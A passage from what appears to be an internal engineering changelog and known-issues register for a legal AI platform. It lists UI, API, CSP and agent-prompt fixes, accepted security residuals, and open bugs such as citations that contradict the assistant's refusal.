  verify: no blind vision call, recoverable PT failure). LIVE-VERIFIED 2026-07-11 (DRE-search
  automation): per-step screenshots stream into the run viewer AND the Histórico drill-in; step
  screenshots serve 200 at `/automation-screenshots/<automationId>/<runId>/step-N.png`; the run
  completed with no blind-refusal. One more display fix made during that run: the verify-failure
  prefix was still English (`outcome not met:`) - now PT (`resultado não atingido:`) in
  `engine.ts` (the one test asserting the prefix updated).
- **`automation-run-surfaces-word-wrap`** (operator-reported, 2026-07-11) - extends
  `run-activity-bar-word-wrap` to the terminal states + the run viewer: the completed/failed activity
  bar and the run-viewer run-level + per-step error surfaces rendered long unformatted text that
  ballooned the layout. Fixed with `min-w-0 break-words` + `line-clamp` (2-3 lines, full text on
  `title`) on the completed/failed `Headline` detail (`run-activity-bar.tsx`) and the error blocks
  (`run-viewer.tsx`). Also: the vision resolver/verifier/fixer/classifier prompts now instruct the
  model to write human-facing free-text (reasoning, userInstructions) in pt-PT while keeping all JSON
  keys/enums in English.

- **`apps-embed-frame-headers`** - the `/apps/*` embed surface now answers CSP
  `frame-ancestors 'self'` + the configured dashboard origins (`EKOA_DASHBOARD_ORIGINS` csv ->
  `EKOA_APP_ORIGIN` -> dev localhost:3000; invalid entries dropped) with NO `X-Frame-Options`;
  the dashboard CSP gained `frame-src`/`img-src` for the api origin. The preview iframe renders
  live and is pinned by e2e. Other planes unchanged (API `'none'`+DENY, served `'self'`+SAMEORIGIN).
- **`registo-targetIds`** - `registoEntry.targetIds` emitted the metadata object where the schema
  wants `array(Id)`, failing `RegistoListResponse` validation; now derives ids from id-keyed metadata.
  Verified live.
- **`/users` + `/usage` crashes** - undefined `.toLocaleString()`; `adminListUsage` now left-joins
  users and emits the full gauge surface, `fmtTokens` on totals.
- **integrations page crash** - the session stub now answers `sessionConnect` + `actions`
  (`SessionCaptureStatus` carries both).
- **artifact versions 500** - `readVersions` graceful dual-jail for never-built artifacts and the
  featured list. (Featured-artifact `restoreVersion` remains open - see `restoreVersion-featured-500`.)
- **`knowledge.listUploads`** `_id`->`id`; **`ekoaLocal.llmModels`** `{data}` envelope; **servedApp**
  `appDataList`/`appSharedList` envelope - contract fold-ins.
- **artifact thumbnails** - previously unimplemented; now end-to-end (build-mechanics screenshot seam,
  `/artifact-screenshots` static mount, `Artifact.screenshotUrl`, dev CSP `img-src`).
- **automations planner failures** - TRUE ROOT CAUSE: the SDK option was `customSystemPrompt`, ignored
  by Agent SDK 0.2.118 (the option is `systemPrompt`), so EVERY system prompt was silently dropped on
  the live path - the planner never saw the required JSON shape. Fixed, plus `runOneShot` `maxTurns`
  1->3 for thinking-heavy EXPERT one-shots, plus a distinct `plan_unavailable` wire status for egress
  outages (never "reformule o objetivo" for a dead transport).
- **brand research not persisting** - the agent now emits a structured `BrandResearchResult` that is
  merge-written onto `org.branding`.
- **gateway always-FAST clamp** - amended: a request whose model matches one of the three configured
  tier models now runs AND meters at that tier (EXPERT ~20x FAST cost - deliberate); other models keep
  the FAST clamp. This un-starved the strict-JSON EXPERT planner and thinking-heavy builds.
- **`<ekoa-context>` reinjection** - the persisted context block was never re-injected on the next
  turn; now re-injected (`agents/context.ts`).
- **thinking channel** (2026-07-10) - intermediate commentary self-identifying as the engine briefly
  flashed unredacted; now a first-class `thinking_chunk` channel, server-side branding-redacted, and
  `result.text` is answer-only (which also fixed the persisted-answer contamination).

## Previously fixed - rc-1 release hardening + batch-final (2026-07-08..10)

All fixed-verified with committed tests: **F1** (auth lifecycle - refresh/logout/password/device +
jti revoke), **F2** (credential provisioning + live turn), **F3** (Registo CRUD/login/build write
coverage, metadata-only, org-scoped), **F4** (branding research + `PUT /branding` alias), **F5**
(UI-called endpoints mounted + mount-coverage drift gate), **F6** (terminal JSON-envelope 404),
**F7** (honest failed-build serving state + `Job.error`), **F10** (per-org deny-list resolver wired +
org-admin CRUD + live masking proof), **F11** (session rename `name`/`title` + `createdAt`/`updatedAt`),
**F13** (stale `credentials.ts` header), **F16/F28** (build served the untouched scaffold and verify
passed it - `BUILD_UNFULFILLED`/`VERIFY_FAILED` terminals + live J3 re-proof), **F20** (chat result
truncation - persisted == concatenated chunks), **F21** (memory recall injection wired + backfilled
test), **F22** (`memoryView` omitted `orgId`/`tags` - `/memory` rendered 0 cards), **F23** (7 console
errors on `/memory`), **F25** (host-context bleed - mechanism reproduced, hardened, accepted residual
documented), **F26** (de-anon round-trip broken by model whitespace reformatting - format-tolerant
detokenizer + 13k-case security property), **F29** (automation plan-from-goal 500 -> structured
`plan_failed` 200). **F19** was a verified billing PASS (no fix).

## Accepted / by-design / won't-fix

- **collections-engine access rules defined-not-enforced** (tracked `docs/decisions.md` 2026-07-07).
  The per-collection `access`/`declaredOnly`/field/size rules are defined in
  `data/collections-engine.ts` but not threaded end-to-end: no producer (app manifest) declares
  `collections`, so the plane runs at the safe default (schemaless, 256 KiB, app-scope). Not
  exploitable. Close both halves together when a producer lands: wire the manifest's `collections`
  block onto `artifact.collections` AND thread the resolved rule into the engine + gate `access`
  levels in `served-data.ts`.
- **served-app per-app data plane open posture** (by-design). `/api/app-data` is unauthenticated app-
  global storage scoped only by `X-Ekoa-App-Id`, carried verbatim for byte-compatibility; private data
  belongs on the server-authenticated shared/JWT/SSO planes. Documented in `docs/security.md`.
- **`docx-clean-drops-comments`** (accepted, kept deliberately; found by the 2C-S7 docx gate,
  2026-07-25). `POST /api/app-docx/clean` (`document-source.getClean` ->
  `docx-redline.acceptAllRevisions`) returns a document with NO comments: @adeu/core 1.28.0's
  `accept_all_revisions` strips `word/comments.xml`, `commentsExtended.xml`, `commentsIds.xml`,
  `commentsExtensible.xml` AND the in-document `commentRangeStart/End/Reference` anchors. **Word
  itself keeps comments when you accept all changes**, and ekoa-dev's `word-track-changes.md`
  asserted comments survive - that claim was never tested (dev's `acceptAllRevisions` is
  byte-identical to ours and its test only checked for the absence of `w:ins`/`w:del`), so the port
  inherited a false doc, not a regression. KEPT rather than worked around: the clean copy is the
  "final version to send out", and shipping internal review notes to a counterparty is a real legal
  risk. The WORKING copy (`GET /api/app-docx/current`) is unaffected and carries everything. Pinned
  as a tripwire in `api/tests/apps/docx-word-gate.test.ts` (a future engine bump or a deliberate fix
  turns it red, so the lawyer-facing download can never change silently) and documented in
  `docs/word-track-changes.md` §2.4 + the `getClean` header.
- **subprocess PATH home-path residual** (by-design). The agent subprocess inherits the operator's
  home on `PATH`; accepted residual from the F25 hardening (disposition doc committed).
- **`sweepOrphans` boot-recovery gap** (accepted). Boot-time crash recovery flips orphaned jobs to
  `failed{ORPHANED}` without a Registo row; guaranteed-once holds on the normal live path.
- **F9** (won't-fix-minor). Trigger disable (410) is unreachable over the API (delete-only lifecycle).
- **F24** (won't-fix-minor). Extraction can persist a markdown-only junk memory (`**`).
- **F27** (won't-fix-minor). `GET /registo?type=anonymisation` returns 0 rows - filter-granularity
  confusion (the qualified query returns all rows); not a missing row.
- **F30** (won't-fix-minor). Builds do not emit a `memory-extract` billing row (build post-run
  extraction differs from the chat path).
- **served-app assistant "Fontes" can contradict the reply** (open; found by D2 fresh review, 2026-07-13; CONFIRMED harder by D3 live evidence: 5 authoritative-looking Acórdão citations rendered directly under an explicit "não posso responder" refusal — slices/D3 live-04-fontes.png of run 20260712-150958-4bb23640).
  `runAppAssistant` returns ALL grounding hits as citations (`api/src/apps/app-assistant.ts`
  `grounding.citations`), not the sources the model actually used - the live D2 evidence shows a
  reply saying the excerpts were not used while five "Fontes" render under it. Trust-eroding for a
  cite-your-source legal product. Candidate fix: emit only reply-referenced citations, or suppress
  the list when the model states it grounded on nothing. Owner: D3/F-slice follow-up on the
  operator-run branch (or platform, whichever lands first).
- **served-app anonymous `whoami` logs a console 401** (open platform nit, surfaced by the D2 strict
  console gate, 2026-07-13). `injected-context.ts:110` fetches `/api/app-sso/me`; for an anonymous
  visitor it 401s and the browser logs the failed resource on EVERY served app load. Candidate fix:
  200 `{user:null}` for anonymous (contract response is `z.unknown()`, additive). Until fixed, the
  D2 e2e allowlists exactly this signature (documented in `api/tests/e2e/assistant-panel.e2e.mjs`).
- **served-app health beacon 502 through the dev proxy** (open platform nit, surfaced by the D2
  strict console gate, 2026-07-13). `injected-context.ts:244` POSTs `/api/app-health`; through the
  dev proxy (:4111) it 502s and logs a console error on load. Likely a dev-proxy forwarding gap
  (relates to d55bd02). Prod path unverified. Allowlisted (documented) in the D2 e2e only.

## F-2026-07-18-invalid-date-cards (open, cosmetic)
Artifact cards on /artifacts render "Invalid Date" for dev-seeded artifacts whose createdAt is
empty (visible in the OS-mode walkthrough, classic beats). Real user-created artifacts carry
timestamps; the fix is either seeding createdAt in the dev fixtures or formatDate falling back
to a dash for missing dates. Surfaced by the walkthrough vision pass; needs a deterministic
close (unit on formatDate fallback) or a written dismissal.
